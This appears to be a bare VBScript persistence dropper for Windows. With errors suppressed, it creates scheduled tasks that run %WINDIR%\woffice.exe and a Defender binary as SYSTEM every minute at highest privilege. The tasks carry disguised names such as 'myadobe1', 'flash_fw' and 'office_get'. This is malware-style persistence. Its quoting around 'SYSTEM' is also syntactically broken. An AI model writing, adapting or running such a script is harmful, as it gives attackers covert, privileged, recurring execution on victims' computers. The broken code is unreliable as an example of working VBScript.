On Error Resume Next
Set oShell = CreateObject ("WScript.Shell") 
windir = oShell.ExpandEnvironmentStrings( "%WINDIR%" )
oShell.run "schtasks /create /tn office_get /xml " & windir & "\office_get.xml /F"
oShell.run "schtasks /create /ru "SYSTEM" /sc minute /mo 1 /tr " & windir & "\woffice.exe" /tn myadobe1 /rl highest /F"
oShell.run "schtasks /create /ru "SYSTEM" /sc minute /mo 1 /tr 'C:\Program Files\Windows Defender\NisSrv.exe' /tn flash_fw /rl highest /F"
oShell.run "schtasks /create /ru "SYSTEM" /sc minute /mo 5 /tr 'taskkill /f /im woffice.exe' /tn myflash /rl highest /F"